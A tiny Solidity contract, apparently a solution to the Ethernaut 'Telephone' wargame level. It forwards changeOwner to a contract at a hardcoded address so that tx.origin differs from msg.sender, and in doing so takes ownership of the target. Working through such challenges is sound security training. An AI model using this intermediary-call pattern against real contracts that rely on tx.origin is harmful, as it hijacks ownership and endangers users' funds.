pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    Telephone(0xf239101753e205cfB0c78c565f38fE08B5C19EAe).changeOwner(_owner);
  }
}